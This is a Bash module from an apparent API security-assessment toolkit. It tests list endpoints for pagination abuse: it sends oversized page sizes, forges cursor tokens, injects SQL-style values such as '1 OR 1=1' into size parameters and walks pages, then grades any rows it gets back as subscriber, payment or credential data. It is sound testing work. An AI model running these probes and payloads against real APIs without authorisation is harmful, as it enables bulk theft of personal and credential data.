#!/usr/bin/env bash
# 63_pagination.sh — cloudsting module 63: the list that hands over the table
# Verbs: --probe | --limits | --cursor | --inject | --walk | --params
#        | --verdicts | --list | --status-tsv | --menu | --selftest | --help
#
# Pagination is the one API feature whose failure mode is silent: a request
# that asks for everything and gets everything back looks exactly like a
# request that asked for twenty and got twenty. So this module measures what
# the server actually returned against what was asked for.
set -u
umask 077

unset CS_MOD_DIR

MODULE_ID="63_pagination"
MOD_NAME="Pagination Abuse (a list endpoint that will hand over the table)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/pagination"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"

: "${PG_TIMEOUT:=10}"
: "${PG_FOLLOW:=0}"
: "${PG_BIG:=100000}"        # what "unbounded" is measured against
: "${PG_SMALL:=1}"           # the control page size
: "${PG_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/63}"

pg_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── the parameters a list endpoint paginates with ────────────────
# Every framework names these differently, and a scan that tries one naming
# convention tests one framework.
#   <name>\t<kind>\t<what a large value asks for>
pg_params() {
    cat <<'PARAMS'
limit	size	how many rows to return
per_page	size	the rails/paginate spelling
page_size	size	the drf spelling
pagesize	size	the .net spelling
count	size	the query style
size	size	the java style
max	size	the elastic spelling
first	size	the graph spelling
top	size	the odata spelling
take	size	the entity framework spelling
offset	offset	where to start
skip	offset	the odata/rethink spelling
start	offset	the elastic spelling
from	offset	the graph spelling
page	number	which page
p	number	the short spelling
pageToken	token	an opaque cursor
cursor	token	a keyset cursor
after	token	the relay spelling
since	token	the twitter spelling
continuation	token	the firestore spelling
marker	token	the azure spelling
PARAMS
}

# A token that a server hands out is usually base64 of an offset or an id, and
# a token a client can forge is a token that is not a cursor at all.
#   <id>\t<kind>\t<literal-token>\t<what it decodes to>
pg_tokens() {
    cat <<'TOKENS'
b64-offset	cursor	c2Zmc2V0PTIw	base64 of offset=20
b64-id	cursor	aWQ6MTAwMA==	base64 of id:1000
b64-json	cursor	eyJvZmZzZXQiOjIwfQ==	base64 of {"offset":20}
plain-id	cursor	1000	a bare id, which a server may accept as a keyset
plain-offset	cursor	20	a bare offset in the cursor slot
sql-hint	cursor	20 OR 1=1	a cursor that reaches a query
neg	cursor	-1	negative, which some servers clamp and some wrap
huge	cursor	999999999	an offset past the end
TOKENS
}

# ── the verdicts ─────────────────────────────────────────────────
# The whole module turns on one comparison: rows returned versus rows asked
# for. A server that returns 1 when asked for 1 and 5000 when asked for 5000
# is not paginating, it is dumping.
#   pg_limit_verdict <asked> <got> <total>
pg_limit_verdict() {
    local asked="$1" got="$2" total="${3:-}"
    [[ "$asked" == "000" ]] && { printf 'unreachable'; return; }
    (( got <= 0 )) && { printf 'empty'; return; }
    if (( asked > 0 && got > asked )); then printf 'over-delivered'; return; fi
    if (( asked >= 1000 && got >= 1000 )); then printf 'unbounded'; return; fi
    if (( got < asked )); then printf 'clamped'; return; fi
    printf 'respected'
}

# Severity is about volume, and about what the rows are. A thousand rows of
# reference data is a smell; a thousand rows of subscribers is the incident.
#   pg_severity <verdict> <rows> <class>
pg_severity() {
    local v="$1" rows="$2" cls="${3:-unknown}"
    case "$v" in
        unbounded|over-delivered)
            case "$cls" in
                subscriber|payment|credential) printf 'CRITICAL' ;;
                *) (( rows >= 10000 )) && printf 'HIGH' || printf 'MEDIUM' ;;
            esac
            ;;
        parameter-ignored|fixed-window)
            # the limit was sent and had no effect: the same dump, seen from
            # the other side, so it carries the same ladder
            case "$cls" in
                subscriber|payment|credential) printf 'CRITICAL' ;;
                *) (( rows >= 10000 )) && printf 'HIGH' || printf 'MEDIUM' ;;
            esac
            ;;
        *) printf 'INFO' ;;
    esac
}

# What the rows are. This decides whether dumping is a finding: the count is
# not the point, the content is.
#   pg_class <file>
pg_class() {
    local file="$1"
    [[ -s "$file" ]] || { printf 'empty'; return; }
    if grep -qaiE '(msisdn|iccid|imsi|subscriber|account_id|customer_id)' "$file" 2>/dev/null; then
        printf 'subscriber'; return
    fi
    if grep -qaiE '("(amount|price|balance|credit|invoice|payment)"[[:space:]]*:)' "$file" 2>/dev/null; then
        printf 'payment'; return
    fi
    if grep -qaiE '("(password|secret|token_hash|api_key|private_key)"[[:space:]]*:)' "$file" 2>/dev/null; then
        printf 'credential'; return
    fi
    if grep -qaiE '("(email|phone|address|dob|national_id)"[[:space:]]*:)' "$file" 2>/dev/null; then
        printf 'personal'; return
    fi
    if grep -qaiE '("(name|title|description|label|slug)"[[:space:]]*:)' "$file" 2>/dev/null; then
        printf 'reference'; return
    fi
    printf 'unknown'
}

# How many records a response body holds. A JSON array is the easy case; a
# wrapper object with one array inside is the common case; an envelope with a
# count is the honest one.
#   pg_rows <file>
pg_rows() {
    local file="$1"
    [[ -s "$file" ]] || { printf '0'; return; }
    if command -v jq >/dev/null 2>&1; then
        local n
        n="$(jq -r 'if type=="array" then length
                    elif type=="object" then
                      ([to_entries[] | select(.value|type=="array") | .value|length] | add) // 0
                    else 0 end' "$file" 2>/dev/null)"
        [[ -n "$n" && "$n" != "null" ]] && { printf '%s' "$n"; return; }
    fi
    # not json (or no jq): count array elements naively, which is enough for a
    # row count that is only compared against another row count
    grep -o '"[a-z_]*"[[:space:]]*:' "$file" 2>/dev/null | wc -l | tr -d ' '
}

# The total a server admits to. When a response says `total: 40000` and hands
# back 20, the pagination works; when it says nothing and hands back
# everything, there is nothing to walk.
#   pg_total <file>
pg_total() {
    local file="$1"
    [[ -s "$file" ]] || { printf ''; return; }
    command -v jq >/dev/null 2>&1 || { printf ''; return; }
    jq -r 'if type=="object" then (.total // .count // .totalCount // .total_count // .meta.total // empty) else empty end' \
        "$file" 2>/dev/null | head -1
}

# A cursor that can be forged is not a cursor. If a client-chosen value changes
# which rows come back, the server is reading an offset out of it and calling
# it opaque.
#   pg_cursor_verdict <first-page-hash> <forged-hash> <forged-rows> <forged-total>
pg_cursor_verdict() {
    local h1="$1" h2="$2" rows="$3" total="${4:-}"
    [[ -z "$h2" ]] && { printf 'rejected'; return; }
    if [[ "$h1" == "$h2" ]]; then printf 'ignored'; return; fi
    (( rows > 0 )) || { printf 'empty-page'; return; }
    if [[ -n "$total" ]] && (( total > rows )); then printf 'walkable'; return; fi
    printf 'accepted'
}

# A page size of 1 and a page size of a million should differ. If the row count
# is identical and non-trivial, the parameter is decoration.
#   pg_delivery_verdict <small-rows> <big-rows> <big-code>
pg_delivery_verdict() {
    local s="$1" b="$2" code="${3:-200}"
    [[ "$code" == "000" ]] && { printf 'unreachable'; return; }
    (( b <= 0 )) && { printf 'broken'; return; }
    (( s <= 0 )) && { printf 'small-empty'; return; }
    if (( b == s )); then
        (( b > 100 )) && { printf 'parameter-ignored'; return; }
        printf 'fixed-window'
        return
    fi
    (( b > s )) && { printf 'honours-limit'; return; }
    printf 'inverted'
}

# ── the reader ───────────────────────────────────────────────────
#   pg_fetch <url> -> code \x1f bytes \x1f rows \x1f total \x1f body-path
pg_fetch() {
    local url="$1"
    local bodyf
    bodyf="$(mktemp "$CS_SCRATCH/pgb.XXXXXX")" 2>/dev/null || bodyf="$OUT_DIR/.pgb.$$"
    local -a args=(-sS -o "$bodyf" -w '%{http_code}' -m "$PG_TIMEOUT" -A "$PG_UA")
    [ "$PG_FOLLOW" = "1" ] && args+=(-L)
    local code
    code="$(curl "${args[@]}" "$url" 2>/dev/null || printf '000')"
    local bytes rows total
    bytes="$(wc -c < "$bodyf" 2>/dev/null | tr -d ' ')"
    rows="$(pg_rows "$bodyf")"
    total="$(pg_total "$bodyf")"
    printf '%s\037%s\037%s\037%s\037%s\n' "$code" "${bytes:-0}" "${rows:-0}" "$total" "$bodyf"
}

# Append one parameter, honouring an existing query string.
pg_with() {
    local url="$1" key="$2" value="$3"
    local sep="?"; [[ "$url" == *"?"* ]] && sep="&"
    printf '%s%s%s=%s' "$url" "$sep" "$key" "$value"
}

# ── verbs ────────────────────────────────────────────────────────

# --probe <url>: the control. How many rows does this endpoint return when
# asked for exactly one.
pg_cmd_probe() {
    local url="${1:-}"
    [[ -z "$url" ]] && { pg_log "usage: --probe <url>"; return 2; }
    cs_row TARGET "$url"
    local code bytes rows total bodyf
    cs_split "$(pg_fetch "$url")" code bytes rows total bodyf
    local cls; cls="$(pg_class "$bodyf")"
    local total_v="${total:-none}"
    cs_row RESPONSE "code=$code" "bytes=$bytes" "rows=$rows" "total=$total_v" "class=$cls"
    rm -f "$bodyf"

    # a first request that already returns everything is the finding
    if (( rows >= 100 )); then
        local sev; sev="$(pg_severity unbounded "$rows" "$cls")"
        cs_row VERDICT "dumps-by-default" "rows=$rows sev=$sev"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "$sev" "pagination-default" \
            "an unparameterised GET returned $rows rows ($cls) — the default page is the whole table"
    else
        cs_row VERDICT "paginated" "rows=$rows"
    fi
    cs_row SUMMARY "code=$code rows=$rows class=$cls"
    return 0
}

# --limits <url>: ask for one, ask for a million, compare. This is the whole
# attack: a server that answers both with the same page is not paginating.
pg_cmd_limits() {
    local url="${1:-}" param="${2:-}"
    [[ -z "$url" ]] && { pg_log "usage: --limits <url> [size-param]"; return 2; }
    cs_row TARGET "$url"

    local -a names
    if [[ -n "$param" ]]; then
        names=("$param")
    else
        mapfile -t names < <(pg_params | awk -F'\t' '$2=="size"{print $1}')
    fi
    cs_row PARAMS "$(printf '%s ' "${names[@]}")"

    : > "$PROBE_FILE"
    local best_hits=0 best_rows=0 best_param="" best_code="" best_class="empty" best_body="" best_verdict=""
    local p code bytes rows total bodyf
    for p in "${names[@]}"; do
        # the small page is the control: same endpoint, honest request
        local s_code s_bytes s_rows s_total s_body
        cs_split "$(pg_fetch "$(pg_with "$url" "$p" "$PG_SMALL")")" s_code s_bytes s_rows s_total s_body
        local b_code b_bytes b_rows b_total b_body
        cs_split "$(pg_fetch "$(pg_with "$url" "$p" "$PG_BIG")")" b_code b_bytes b_rows b_total b_body

        local dv; dv="$(pg_delivery_verdict "$s_rows" "$b_rows" "$b_code")"
        local cls; cls="$(pg_class "$b_body")"
        printf 'param\t%s\t%s\t%s\t%s\t%s\t%s\n' "$p" "$s_rows" "$b_rows" "$dv" "$cls" "$b_bytes" >> "$PROBE_FILE"

        if [[ "$dv" == "parameter-ignored" || "$dv" == "honours-limit" || "$dv" == "fixed-window" ]] && (( b_rows > best_hits )); then
            best_hits="$b_rows"; best_rows="$b_rows"; best_param="$p"
            best_code="$b_code"; best_class="$cls"; best_body="$b_body"; best_verdict="$dv"
        else
            cs_row PARAM "$p" "small=$s_rows" "big=$b_rows" "$dv"
        fi
        rm -f "$s_body" "$b_body"
    done

    if (( best_rows > 0 )); then
        local lv="clamped"
        (( best_rows >= 1000 )) && lv="unbounded"
        local sev; sev="$(pg_severity "$lv" "$best_rows" "$best_class")"
        # parameter-ignored means both requests came back identical, which is
        # the same failure as unbounded: nothing bounded the page
        [[ "$best_verdict" == "parameter-ignored" ]] && lv="parameter-ignored"
        sev="$(pg_severity "$lv" "$best_rows" "$best_class")"
        cs_row HIT "$best_param" "rows=$best_rows" "code=$best_code" "class=$best_class" "sev=$sev" "$best_verdict"
        printf '%s\t%s\t%s\t%s\n' "$best_param" "$best_rows" "$best_class" "$sev" >> "$HIT_FILE"
        if [[ "$sev" != "INFO" ]]; then
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "$sev" "pagination-$lv" \
                "$best_param=$PG_BIG returned $best_rows rows of $best_class and the limit had no effect — the page size is a request, not a limit"
            cs_row VERDICT "$lv" "param=$best_param rows=$best_rows"
        else
            cs_row VERDICT "wide-page" "param=$best_param rows=$best_rows"
        fi
    else
        cs_row VERDICT "bounded" "no size parameter widened the page"
    fi
    cs_row SUMMARY "params=${#names[@]} widest=$best_rows"
    cs_row ARTIFACT "$PROBE_FILE"
    return 0
}

# --cursor <url> <param>: is the cursor opaque. A token a client can edit is an
# offset with a longer name.
pg_cmd_cursor() {
    local url="${1:-}" param="${2:-cursor}"
    [[ -z "$url" ]] && { pg_log "usage: --cursor <url> [token-param]"; return 2; }
    cs_row TARGET "$url"
    cs_row PARAM "$param"

    # the first page, to have something to compare against
    local f_code f_bytes f_rows f_total f_body
    cs_split "$(pg_fetch "$url")" f_code f_bytes f_rows f_total f_body
    local first_hash; first_hash="$(cs_fingerprint "$f_body")"
    cs_row FIRST "code=$f_code" "rows=$f_rows" "total=${f_total:-none}"
    rm -f "$f_body"

    local hits=0 tried=0
    local id kind token what
    while IFS=$'\t' read -r id kind token what; do
        [[ -z "$id" ]] && continue
        tried=$((tried + 1))
        local code bytes rows total bodyf
        cs_split "$(pg_fetch "$(pg_with "$url" "$param" "$token")")" code bytes rows total bodyf
        local h; h="$(cs_fingerprint "$bodyf")"
        local v; v="$(pg_cursor_verdict "$first_hash" "$h" "$rows" "$total")"
        rm -f "$bodyf"

        case "$v" in
            walkable|accepted)
                hits=$((hits + 1))
                cs_row HIT "$id" "code=$code" "rows=$rows" "verdict=$v" "$what"
                cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "MEDIUM" "forgeable-cursor" \
                    "$param accepts a client-supplied $id ($what) and returns $rows rows — the cursor is not opaque"
                ;;
            *)
                cs_row TOKEN "$id" "code=$code" "rows=$rows" "$v"
                ;;
        esac
    done < <(pg_tokens)

    cs_row VERDICT "$( (( hits > 0 )) && echo forgeable || echo opaque)" "$hits of $tried tokens walked"
    cs_row SUMMARY "tokens=$tried forged=$hits"
    return 0
}

# --inject <url> <param>: a page size that reaches the query. The value is put
# into the size parameter and what comes back tells you whether it was
# validated.
pg_cmd_inject() {
    local url="${1:-}" param="${2:-limit}"
    [[ -z "$url" ]] && { pg_log "usage: --inject <url> [size-param]"; return 2; }
    cs_row TARGET "$url"
    cs_row PARAM "$param"

    local code bytes rows total bodyf
    cs_split "$(pg_fetch "$(pg_with "$url" "$param" "$PG_SMALL")")" code bytes rows total bodyf
    local base_rows="$rows"
    cs_row CONTROL "rows=$base_rows"
    rm -f "$bodyf"

    local -a payloads=("1 OR 1=1" "1;SELECT 1" "1e9" "0x10" "-1" "'1'" "1,100000" "NaN" "Infinity" "[]")
    local hits=0
    local p
    for p in "${payloads[@]}"; do
        local enc; enc="$(printf '%s' "$p" | jq -sRr @uri 2>/dev/null || printf '%s' "$p")"
        local r_code r_bytes r_rows r_total r_body
        cs_split "$(pg_fetch "$(pg_with "$url" "$param" "$enc")")" r_code r_bytes r_rows r_total r_body
        local cls; cls="$(pg_class "$r_body")"
        rm -f "$r_body"
        if (( r_rows > base_rows * 2 )) && (( r_rows > 10 )); then
            hits=$((hits + 1))
            cs_row HIT "$param=$p" "code=$r_code" "rows=$r_rows" "base=$base_rows" "class=$cls"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "HIGH" "pagination-injection" \
                "$param=$p returned $r_rows rows against a control of $base_rows — the value is interpolated, not parsed"
        elif [[ "$r_code" == "000" ]]; then
            cs_row PROBE "$param=$p" "unreachable"
        else
            cs_row PROBE "$param=$p" "code=$r_code" "rows=$r_rows"
        fi
    done
    cs_row VERDICT "$( (( hits > 0 )) && echo injectable || echo parsed)" "$hits of ${#payloads[@]} payloads widened the page"
    cs_row SUMMARY "payloads=${#payloads[@]} hits=$hits base=$base_rows"
    return 0
}

# --walk <url> [param] [size]: does walking pages actually enumerate the table.
# Reports the pages it read and the distinct rows it saw, because a walk that
# keeps returning page one is a different bug from a bounded one.
pg_cmd_walk() {
    local url="${1:-}" param="${2:-page}" size="${3:-100}" maxpages="${4:-5}"
    [[ -z "$url" ]] && { pg_log "usage: --walk <url> [page-param] [size] [pages]"; return 2; }
    cs_row TARGET "$url"
    cs_row PARAM "$param" "size=$size" "pages=$maxpages"

    local total_rows=0 page prev_hash="" repeated=0 distinct_pages=0
    local i
    for ((i = 1; i <= maxpages; i++)); do
        local u; u="$(pg_with "$url" "$param" "$i")"
        local code bytes rows total bodyf
        cs_split "$(pg_fetch "$u")" code bytes rows total bodyf
        local h; h="$(cs_fingerprint "$bodyf")"
        local cls; cls="$(pg_class "$bodyf")"
        rm -f "$bodyf"

        cs_row PAGE "$i" "code=$code" "rows=$rows" "total=${total:-none}" "class=$cls"
        total_rows=$((total_rows + rows))
        if [[ -n "$prev_hash" && "$h" == "$prev_hash" ]]; then
            repeated=$((repeated + 1))
        else
            distinct_pages=$((distinct_pages + 1))
        fi
        prev_hash="$h"
        (( rows == 0 )) && break
    done

    cs_row TOTALS "rows=$total_rows" "distinct-pages=$distinct_pages" "repeated=$repeated"
    if (( repeated > 0 && total_rows > 0 )); then
        cs_row VERDICT "page-param-ignored" "the same page came back $repeated more times"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "MEDIUM" "walk-repeat" \
            "$param did not change the page — a walker cannot enumerate this endpoint"
    else
        cs_row VERDICT "walks" "$total_rows rows over $distinct_pages pages"
    fi
    cs_row SUMMARY "rows=$total_rows distinct=$distinct_pages"
    return 0
}

pg_cmd_params() {
    local n kind what
    while IFS=$'\t' read -r n kind what; do
        [[ -z "$n" ]] && continue
        cs_row PARAM "$n" "$kind" "$what"
    done < <(pg_params)
    cs_row SUMMARY "params=$(pg_params | wc -l | tr -d ' ')"
    return 0
}

pg_cmd_verdicts() {
    cat <<'V' | while IFS=$'\t' read -r v meaning; do
unreachable	the request failed outright
empty	the page came back with no rows
over-delivered	more rows came back than were asked for
unbounded	the page size was accepted and the limit was not applied
clamped	the server applied a limit of its own — the honest answer
respected	the page size was honoured exactly
parameter-ignored	page 1 and page 1000000 returned the same thing
fixed-window	the size parameter did nothing and the window is fixed
V
        cs_row VERDICT "$v" "$meaning"
    done
    cs_row SUMMARY "verdicts=8"
    return 0
}

pg_cmd_list() { pg_cmd_params; }

pg_cmd_status_tsv() {
    local curl_state jq_state
    command -v curl >/dev/null 2>&1 && curl_state="curl-ok" || curl_state="curl-missing"
    command -v jq   >/dev/null 2>&1 && jq_state="jq-ok"     || jq_state="jq-missing"
    printf '%s\t%s\t%s\t%s\tparams-%s\ttokens-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$jq_state" \
        "$(pg_params | wc -l | tr -d ' ')" "$(pg_tokens | wc -l | tr -d ' ')"
}

pg_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

pg_cmd_help() {
    cat <<'HELP'
cloudsting module 63 — Pagination Abuse v1.0.0
  --probe <url>                     what the endpoint returns with no parameters
  --limits <url> [size-param]       ask for 1, ask for 100000, compare
  --cursor <url> [token-param]      is the cursor opaque, or an offset with a longer name
  --inject <url> [size-param]       does the page size reach the query
  --walk <url> [param] [size] [n]   does walking pages actually enumerate the table
  --params | --verdicts | --list
  --status-tsv | --menu | --selftest | --help

Pagination is the one API feature whose failure mode is silent: a request that
asks for everything and gets everything looks exactly like a request that asked
for twenty and got twenty. So every verb here compares what came back against
what was asked for, and reports the difference.

A count of rows is not a finding on its own — the content decides the severity.
A thousand rows of reference data is a smell; a thousand rows of subscribers is
the assessment.

Environment: PG_TIMEOUT (10), PG_BIG (100000), PG_SMALL (1), PG_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
pg_selftest() {
    cs_selftest_reset

    local np; np="$(pg_params | wc -l | tr -d ' ')"
    chk par-many   "$( (( np >= 20 )) && echo many || echo few )" "many"
    chk par-3col   "$(pg_params | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk par-unique "$(pg_params | cut -f1 | sort -u | wc -l | tr -d ' ')" "$np"
    chk par-kind   "$(pg_params | awk -F'\t' '$2 !~ /^(size|offset|number|token)$/{c++} END{print c+0}')" "0"
    local nt; nt="$(pg_tokens | wc -l | tr -d ' ')"
    chk tok-many   "$( (( nt >= 6 )) && echo many || echo few )" "many"
    chk tok-4col   "$(pg_tokens | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"

    # the limit verdict is the module
    chk l-unreach  "$(pg_limit_verdict 000 0 '')" "unreachable"
    chk l-empty    "$(pg_limit_verdict 100 0 '')" "empty"
    chk l-over     "$(pg_limit_verdict 10 20 '')" "over-delivered"
    chk l-unbound  "$(pg_limit_verdict 5000 5000 '')" "unbounded"
    chk l-clamped  "$(pg_limit_verdict 100 100 '')" "respected"
    chk l-clamp    "$(pg_limit_verdict 100 20 '')" "clamped"

    chk d-unreach  "$(pg_delivery_verdict 0 0 000)" "unreachable"
    chk d-ignored  "$(pg_delivery_verdict 500 500 200)" "parameter-ignored"
    chk d-fixed    "$(pg_delivery_verdict 20 20 200)" "fixed-window"
    chk d-honours  "$(pg_delivery_verdict 1 500 200)" "honours-limit"
    chk d-broken   "$(pg_delivery_verdict 1 0 200)" "broken"
    chk d-small    "$(pg_delivery_verdict 0 5 200)" "small-empty"

    chk c-reject   "$(pg_cursor_verdict abc '' 0 '')" "rejected"
    chk c-ignored  "$(pg_cursor_verdict abc abc 20 '')" "ignored"
    chk c-walk     "$(pg_cursor_verdict abc def 20 4000)" "walkable"
    chk c-accept   "$(pg_cursor_verdict abc def 20 '')" "accepted"
    chk c-empty    "$(pg_cursor_verdict abc def 0 '')" "empty-page"

    chk s-crit     "$(pg_severity unbounded 5000 subscriber)" "CRITICAL"
    chk s-high     "$(pg_severity unbounded 50000 unknown)" "HIGH"
    chk s-med      "$(pg_severity unbounded 2000 unknown)" "MEDIUM"
    chk s-info     "$(pg_severity respected 20 subscriber)" "INFO"

    # row counting has to handle an array, a wrapper and a non-json body
    local f; f="$(mktemp "$CS_SCRATCH/pg-j.XXXXXX")" 2>/dev/null || f="$OUT_DIR/.j.$$"
    printf '[{"a":1},{"a":2},{"a":3}]' > "$f"
    chk rows-array  "$(pg_rows "$f")" "3"
    printf '{"items":[{"a":1},{"a":2}],"total":4000}' > "$f"
    chk rows-wrap   "$(pg_rows "$f")" "2"
    chk total-read  "$(pg_total "$f")" "4000"
    printf '{"count":77,"data":[]}' > "$f"
    chk total-count "$(pg_total "$f")" "77"
    printf '<html>nope</html>' > "$f"
    chk rows-none   "$(pg_rows "$f")" "0"
    : > "$f"
    chk rows-empty  "$(pg_rows "$f")" "0"
    rm -f "$f"

    # classification decides severity, so it has to be right
    local g; g="$(mktemp "$CS_SCRATCH/pg-c.XXXXXX")" 2>/dev/null || g="$OUT_DIR/.c.$$"
    printf '[{"msisdn":"254700000000"}]' > "$g"
    chk cl-subs     "$(pg_class "$g")" "subscriber"
    printf '[{"amount":10,"balance":5}]' > "$g"
    chk cl-pay      "$(pg_class "$g")" "payment"
    printf '[{"api_key":"x"}]' > "$g"
    chk cl-cred     "$(pg_class "$g")" "credential"
    printf '[{"email":"a@b.c"}]' > "$g"
    chk cl-personal "$(pg_class "$g")" "personal"
    printf '[{"name":"widget"}]' > "$g"
    chk cl-ref      "$(pg_class "$g")" "reference"
    printf '[{"zzz":1}]' > "$g"
    chk cl-unknown  "$(pg_class "$g")" "unknown"
    : > "$g"
    chk cl-empty    "$(pg_class "$g")" "empty"
    rm -f "$g"

    # the URL builder must respect an existing query string
    chk with-fresh "$(pg_with 'http://h/a' limit 5)" 'http://h/a?limit=5'
    chk with-query "$(pg_with 'http://h/a?x=1' limit 5)" 'http://h/a?x=1&limit=5'

    # a dead host is silent, never a dump
    local out; out="$(pg_cmd_limits http://127.0.0.1:9 limit 2>/dev/null)"
    chk dead-verdict "$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')" "bounded"
    chk dead-hits    "$(printf '%s' "$out" | awk -F'\t' '$1=="HIT"' | wc -l | tr -d ' ')" "0"

    # usage errors, not crashes
    pg_cmd_probe 2>/dev/null;  chk prb-usage "$?" "2"
    pg_cmd_limits 2>/dev/null; chk lim-usage "$?" "2"
    pg_cmd_cursor 2>/dev/null; chk cur-usage "$?" "2"
    pg_cmd_inject 2>/dev/null; chk inj-usage "$?" "2"
    pg_cmd_walk 2>/dev/null;   chk wlk-usage "$?" "2"

    # shape contracts
    chk status-fields "$(pg_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(pg_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(pg_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(pg_cmd_help | head -1 | grep -ci 'Pagination Abuse')" "1"
    chk par-rows      "$(pg_cmd_params | grep -c '^PARAM')" "$np"
    chk verdict-rows  "$(pg_cmd_verdicts | grep -c '^VERDICT')" "8"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --probe)   shift; pg_cmd_probe "$@";;
    --limits)  shift; pg_cmd_limits "$@";;
    --cursor)  shift; pg_cmd_cursor "$@";;
    --inject)  shift; pg_cmd_inject "$@";;
    --walk)    shift; pg_cmd_walk "$@";;
    --params)  pg_cmd_params;;
    --verdicts) pg_cmd_verdicts;;
    --list)    pg_cmd_list;;
    --status-tsv|--status) pg_cmd_status_tsv;;
    --menu)    pg_cmd_menu;;
    --selftest) pg_selftest;;
    *)         pg_cmd_help;;
esac
